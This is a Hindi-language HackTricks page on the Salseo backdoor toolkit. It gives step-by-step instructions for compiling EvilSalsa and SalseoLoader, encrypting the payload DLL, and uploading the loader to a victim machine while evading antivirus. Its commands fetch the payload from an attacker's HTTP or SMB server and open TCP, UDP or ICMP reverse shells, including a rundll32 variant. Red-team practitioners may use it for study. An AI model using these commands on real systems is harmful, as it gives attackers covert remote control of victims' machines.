# सलसेओ

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **पीआर जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## बाइनरी को कंपाइल करना

गिटहब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को कंपाइल करें। कोड को कंपाइल करने के लिए **Visual Studio** इंस्टॉल करना होगा।

इन परियोजनाओं को उस विंडोज बॉक्स के आर्किटेक्चर के लिए कंपाइल करें जहां आप उन्हें उपयोग करने जा रहे हैं (यदि विंडोज x64 का समर्थन करता है तो उन्हें उस आर्किटेक्चर के लिए कंपाइल करें)।

आप **Visual Studio** में **"Platform Target"** में **वाम "Build" टैब** में **आर्किटेक्चर का चयन** कर सकते हैं।

(\*\*यदि आप इस विकल्प को नहीं ढूंढ सकते तो **"प्रोजेक्ट टैब"** में जाएं और फिर **"\<प्रोजेक्ट नाम> गुणवत्ता"** में जाएं)

![](<../.gitbook/assets/image (132).png>)

फिर, दोनों परियोजनाओं को बनाएं (बिल्ड -> समाधान बनाएं) (लॉग्स के अंदर एक्जीक्यूटेबल का पथ दिखाई देगा):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## बैकडोर की तैयारी

सबसे पहले, आपको **EvilSalsa.dll** को एन्कोड करने की आवश्यकता होगी। इसे करने के लिए, आप **encrypterassembly.py** पायथन स्क्रिप्ट का उपयोग कर सकते हैं या आप परियोजना **EncrypterAssembly** को कंपाइल कर सकते हैं: 

### **पायथन**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास सारे Salseo चीजों को निष्पादित करने के लिए जो चाहिए: **encoded EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**SalseoLoader.exe बाइनरी को मशीन पर अपलोड करें। इन्हें किसी भी AV द्वारा पहचाना नहीं जाना चाहिए...**

## **बैकडोर को निष्पादित करें**

### **TCP रिवर्स शैल प्राप्त करना (HTTP के माध्यम से एन्कोडेड dll को डाउनलोड करना)**

ध्यान दें कि रिवर्स शैल सुनने वाले के रूप में एनसी शुरू करें और एक HTTP सर्वर शुरू करें जो एन्कोडेड evilsalsa को सेवा करेगा।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **एक UDP रिवर्स शैल (SMB के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शैल सुनने वाले के रूप में एनसी शुरू करें, और एक SMB सर्वर को एन्कोडेड evilsalsa की सेवा करने के लिए (impacket-smbserver)।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **एक ICMP रिवर्स शैल (एंकोडेड डीएल पहले से ही पीड़ित के अंदर)**

**इस बार आपको रिवर्स शैल प्राप्त करने के लिए क्लाइंट में एक विशेष उपकरण की आवश्यकता है। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP जवाब अक्षम करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, हम salseo चीज को चलाते हैं:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## कॉंपाइलिंग SalseoLoader को DLL के रूप में मुख्य फ़ंक्शन को निर्यात करना

Visual Studio का उपयोग करके SalseoLoader परियोजना खोलें।

### मुख्य फ़ंक्शन से पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस परियोजना के लिए DllExport इंस्टॉल करें

#### **उपकरण** --> **NuGet पैकेज प्रबंधक** --> **समाधान के लिए NuGet पैकेज स्थापित करें...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज (ब्राउज़ टैब का उपयोग करके) खोजें और स्थापित करें (और पॉपअप स्वीकार करें)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

आपके परियोजना फ़ोल्डर में फ़ाइलें दिखाई देने लगी हैं: **DllExport.bat** और **DllExport\_Configure.bat**

### **DllExport को अनइंस्टॉल करें**

**अनइंस्टॉल** दबाएं (हां, यह अजीब है लेकिन मुझ पर भरोसा करें, यह आवश्यक है)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Visual Studio बंद करें और DllExport\_configure को चलाएं**

बस **बंद** करें Visual Studio

फिर, अपने **SalseoLoader फ़ोल्डर** पर जाएं और **DllExport\_Configure.bat** को चलाएं

**x64** का चयन करें (यदि आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, तो यह मेरा मामला था), **System.Runtime.InteropServices** का चयन करें (**DllExport के लिए नेमस्पेस**) और **Apply** दबाएं

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **परियोजना को फिर से Visual Studio के साथ खोलें**

**\[DllExport]** को अब और त्रुटि के रूप में नहीं चिह्नित किया जाना चाहिए

![](<../.gitbook/assets/image (8) (1).png>)

### समाधान को बिल्ड करें

**आउटपुट प्रकार = क्लास लाइब्रेरी** का चयन करें (परियोजना --> SalseoLoader गुण --> एप्लिकेशन --> आउटपुट प्रकार = क्लास लाइब्रेरी)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 प्लेटफ़ॉर्म** का चयन करें (परियोजना --> SalseoLoader गुण --> बिल्ड --> प्लेटफ़ॉर्म लक्ष्य = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

समाधान **बिल्ड** करने के लिए: बिल्ड --> समाधान बिल्ड करें (नए DLL का पथ आउटपुट कंसोल के अंदर दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

Dll की प्रतिलिपि बनाएं और जहां आप इसे परीक्षण करना चाहते हैं, वहां पेस्ट करें।

चलाएं:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि प्रकट नहीं होती है, तो संभावित रूप से आपके पास एक कार्यात्मक DLL है!!

## DLL का उपयोग करके शैल प्राप्त करें

**HTTP** **सर्वर** का उपयोग करना न भूलें और एक **nc** **सुनने वाला** सेट करें

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

कमांड्स
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ</strong>!</summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos में PRs सबमिट करके।

</details>
